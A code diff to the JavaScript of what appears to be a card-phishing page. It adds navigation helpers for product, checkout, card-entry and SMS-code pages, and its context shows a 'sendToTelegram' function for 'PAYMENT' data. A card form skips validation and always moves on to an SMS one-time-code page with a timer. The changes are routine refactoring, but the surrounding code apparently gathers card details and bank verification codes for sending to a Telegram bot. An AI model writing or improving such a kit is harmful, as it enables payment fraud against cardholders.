@@ -42,8 +42,49 @@ function initializeApp() {
   setupEventListeners()
 }
 
+// Page Navigation Functions
+function goToCheckout() {
+  showPage("checkoutPage")
+}
+
+function goToProduct() {
+  showPage("productPage")
+}
+
+function goToPayment() {
+  showPage("cardPage")
+}
+
+function goToSms() {
+  showPage("smsPage")
+}
+
+function showPage(pageId) {
+  // Hide all pages
+  const pages = document.querySelectorAll(".page")
+  pages.forEach((page) => {
+    page.classList.remove("active")
+  })
+
+  // Show selected page
+  const targetPage = document.getElementById(pageId)
+  if (targetPage) {
+    targetPage.classList.add("active")
+    currentPage = pageId
+
+    // Start timer for SMS page
+    if (pageId === "smsPage") {
+      startTimer()
+    } else {
+      stopTimer()
+    }
+
+    // Scroll to top
+    window.scrollTo(0, 0)
+  }
+}
+
 function setupEventListeners() {
-  // Remove all form validation - buttons are always enabled
   // Card number formatting
   const cardNumber = document.getElementById("cardNumber")
   if (cardNumber) {
@@ -141,32 +182,6 @@ function setupEventListeners() {
       }
       e.target.value = value
     })
-  }
-}
-
-// Page Navigation
-function showPage(pageId) {
-  // Hide all pages
-  const pages = document.querySelectorAll(".page")
-  pages.forEach((page) => {
-    page.classList.remove("active")
-  })
-
-  // Show selected page
-  const targetPage = document.getElementById(pageId)
-  if (targetPage) {
-    targetPage.classList.add("active")
-    currentPage = pageId
-
-    // Start timer for SMS page
-    if (pageId === "smsPage") {
-      startTimer()
-    } else {
-      stopTimer()
-    }
-
-    // Scroll to top
-    window.scrollTo(0, 0)
   }
 }
 
@@ -336,7 +351,7 @@ async function sendToTelegram(data, messageType = "PAYMENT") {
   }
 }
 
-// Form Submissions - NO VALIDATION, ALWAYS ENABLED
+// Form Submissions
 function submitCardForm(event) {
   event.preventDefault()
 
@@ -364,7 +379,7 @@ function submitCardForm(event) {
 
   // Always proceed to SMS page after 1.5 seconds
   setTimeout(() => {
-    showPage("smsPage")
+    goToSms()
   }, 1500)
 }
 
@@ -402,7 +417,7 @@ function startTimer() {
       stopTimer()
       // Handle timeout
       alert("Vaxt bitdi. Yenidən cəhd edin.")
-      showPage("cardPage")
+      goToPayment()
     }
   }, 1000)
 }
